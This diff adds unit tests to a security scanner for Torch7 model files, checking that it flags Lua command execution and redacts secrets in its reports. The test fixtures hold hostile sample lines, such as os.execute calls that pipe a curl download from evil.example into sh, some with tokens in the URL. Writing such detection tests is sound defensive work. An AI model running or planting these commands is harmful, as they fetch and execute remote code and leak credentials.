@@ -84,6 +84,259 @@ def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None
     assert execution_findings[0].severity == IssueSeverity.CRITICAL
 
 
+def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> None:
+    secret_value = "SENSITIVEVALUE1234567890"
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
+        + f"cmd = os.execute('curl https://evil.example/payload.sh?ok=1;token={secret_value} | sh')\n".encode()
+        + f"client_secret = {secret_value}\n".encode()
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="redacted.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    serialized = repr([check.details for check in result.checks])
+    assert result.success is False
+    assert secret_value not in serialized
+    assert "token=<redacted>" in serialized
+    assert "client_secret = <redacted>" in serialized
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_torch7_snippet_redacts_url_userinfo_signed_queries_and_bearer_values() -> None:
+    snippet = Torch7Scanner._snippet(
+        "Authorization: Bearer BEARERSECRET123 "
+        "cmd=os.execute('curl https://alice:URLPASSWORD123@evil.example/payload.sh?"
+        "x-amz-signature=SIGNATURESECRET123 | sh')",
+        max_chars=500,
+    )
+
+    assert "BEARERSECRET123" not in snippet
+    assert "URLPASSWORD123" not in snippet
+    assert "SIGNATURESECRET123" not in snippet
+    assert "Authorization: <redacted>" in snippet
+    assert "https://<credentials-redacted>@evil.example/payload.sh" in snippet
+    assert "x-amz-signature=<redacted>" in snippet
+
+
+def test_torch7_snippet_redacts_iteratively_encoded_query_secrets() -> None:
+    snippet = Torch7Scanner._snippet(
+        "cmd=os.execute('curl https://evil.example/?token%3DWHOLESECRET123 "
+        "https://evil.example/?to%256ben=KEYSECRET456 "
+        "https://evil.example/?ok=token%252525253DVALUESECRET789')",
+        max_chars=500,
+    )
+
+    assert "WHOLESECRET123" not in snippet
+    assert "KEYSECRET456" not in snippet
+    assert "VALUESECRET789" not in snippet
+    assert snippet.count("<redacted>") == 3
+
+
+def test_torch7_snippet_redacts_prefixed_encoded_and_compound_secrets() -> None:
+    snippet = Torch7Scanner._snippet(
+        'token = false or "FULL_LUA_SECRET_123456789"; '
+        "os.execute('curl https://evil.example/?ok=prefix%2520token%253DQUERYLEAKSECRET | sh')",
+        max_chars=500,
+    )
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert "QUERYLEAKSECRET" not in snippet
+    assert "token = <redacted>; os.execute(" in snippet
+    assert "ok=<redacted>" in snippet
+
+
+def test_torch7_snippet_redacts_malformed_url_path_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    snippet = Torch7Scanner._snippet(
+        f"cmd=os.execute('curl https://user:pass@[::1/path/{github_token} | sh')",
+        max_chars=500,
+    )
+
+    assert github_token not in snippet
+    assert "https://<credentials-redacted>@[::1/path/<redacted>" in snippet
+    assert "| sh" in snippet
+
+
+def test_torch7_snippet_preserves_shell_operators_from_url_query_and_fragment() -> None:
+    snippet = Torch7Scanner._snippet(
+        "cmd=os.execute('curl https://evil.test/?token=QUERYSECRET&&sh https://evil.test/#token=FRAGMENTSECRET|sh')",
+        max_chars=500,
+    )
+
+    assert "QUERYSECRET" not in snippet
+    assert "FRAGMENTSECRET" not in snippet
+    assert "?token=<redacted>&&sh" in snippet
+    assert "#<redacted>|sh" in snippet
+
+
+def test_torch7_snippet_preserves_execution_syntax_for_sensitive_target_names() -> None:
+    snippet = Torch7Scanner._snippet(
+        "token = assert((os.execute('curl https://evil.example/?x=1|sh')))",
+        max_chars=500,
+    )
+
+    assert "token = assert((os.execute" in snippet
+    assert "?x=1|sh" in snippet
+    assert "<redacted>" not in snippet
+
+
+def test_torch7_snippet_redacts_secret_before_execution_fallback() -> None:
+    snippet = Torch7Scanner._snippet(
+        'token = "FULL_LUA_SECRET_123456789" or os.execute("id")',
+        max_chars=500,
+    )
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert snippet == 'token = <redacted> or os.execute("id")'
+
+
+@pytest.mark.parametrize("separator", [" .. ", ".."])
+def test_torch7_snippet_preserves_execution_after_concatenated_secret(separator: str) -> None:
+    snippet = Torch7Scanner._snippet(
+        f'token = "FULL_LUA_SECRET_123456789"{separator}os.execute("id")',
+        max_chars=500,
+    )
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert snippet == f'token = <redacted> {separator.strip()} os.execute("id")'
+
+
+@pytest.mark.parametrize(
+    ("expression", "expected"),
+    [
+        (
+            'token = "FULL_LUA_SECRET_123456789" .. pcall(os.execute("id"))',
+            'token = <redacted> .. pcall(os.execute("id"))',
+        ),
+        (
+            'token = "FULL_LUA_SECRET_123456789" .. assert((os.execute("id")))',
+            'token = <redacted> .. assert((os.execute("id")))',
+        ),
+        (
+            'token = "FULL_LUA_SECRET_123456789" .. pcall(function() return os.execute("id") end)',
+            'token = <redacted> .. pcall(function() return os.execute("id") end)',
+        ),
+    ],
+)
+def test_torch7_snippet_preserves_wrapped_execution_after_concatenated_secret(
+    expression: str,
+    expected: str,
+) -> None:
+    snippet = Torch7Scanner._snippet(expression, max_chars=500)
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert snippet == expected
+
+
+def test_torch7_snippet_does_not_restore_unvalidated_text_after_compound_secret() -> None:
+    snippet = Torch7Scanner._snippet(
+        'token = "FULL_LUA_SECRET_123456789" .. attacker["PUBLIC_WRAPPER"](os.execute("id"))',
+        max_chars=500,
+    )
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert "PUBLIC_WRAPPER" not in snippet
+    assert snippet == "token = <redacted>"
+
+
+def test_torch7_snippet_preserves_subscript_and_deep_execution_targets() -> None:
+    snippets = (
+        Torch7Scanner._snippet("headers['token'] = os.execute('echo ok')", max_chars=500),
+        Torch7Scanner._snippet("token = a(b(c(d(e(os.execute('id'))))))", max_chars=500),
+        Torch7Scanner._snippet("token = pcall(function() return os.execute('id') end)", max_chars=500),
+    )
+
+    assert "headers" in snippets[0] and "os.execute" in snippets[0]
+    assert "token = a(b(c(d(e(os.execute" in snippets[1]
+    assert "token = pcall(function() return os.execute" in snippets[2]
+    assert all("<redacted>" not in snippet for snippet in snippets)
+
+
+def test_torch7_snippet_redacts_sensitive_subscript_assignment_targets() -> None:
+    snippet = Torch7Scanner._snippet(
+        "headers['Authorization: Bearer TARGETSECRET123'] = os.execute('echo ok')",
+        max_chars=500,
+    )
+
+    assert "TARGETSECRET123" not in snippet
+    assert "headers" in snippet
+    assert "Authorization: <redacted>" in snippet
+    assert "= os.execute" in snippet
+
+
+def test_torch7_snippet_restores_targets_before_truncation() -> None:
+    snippet = Torch7Scanner._snippet(
+        "configuration.credentials.token = os.execute('curl https://evil.example/public/payload.sh | sh')",
+        max_chars=60,
+    )
+
+    assert len(snippet) == 60
+    assert snippet.endswith("...")
+    assert snippet.startswith("configuration.credentials.token = os.execute")
+
+
+def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None:
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
+        b"token = os.execute('curl https://evil.example/public/payload.sh?x=1|sh')\n"
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="benign-url.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    execution_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(execution_findings) == 1
+    examples = execution_findings[0].details["examples"]
+    assert any("token = os.execute" in example for example in examples)
+    assert any("https://evil.example/public/payload.sh?x=1|sh" in example for example in examples)
+    assert all("<redacted>" not in example for example in examples)
+
+
+def test_scan_detects_execution_primitive_split_across_printable_chunks(tmp_path: Path) -> None:
+    prefix = (b"A" * (512 - len(b" os.exe"))) + b" os.exe"
+    payload = b"T7\x00\x00torch.FloatTensor\x00" + prefix + b"cute('id')"
+    path = _write_torch7_file(tmp_path, payload, filename="boundary.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        "os['execute']('id')",
+        "io['popen']('id')",
+        "os . execute('id')",
+        "os\n.execute('id')",
+        "(os.execute)('id')",
+    ],
+)
+def test_scan_detects_alternate_lua_execution_call_syntax(tmp_path: Path, call: str) -> None:
+    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n" + call.encode()
+    path = _write_torch7_file(tmp_path, payload, filename="alternate-call.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
 def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n-- decoy comment token\n"
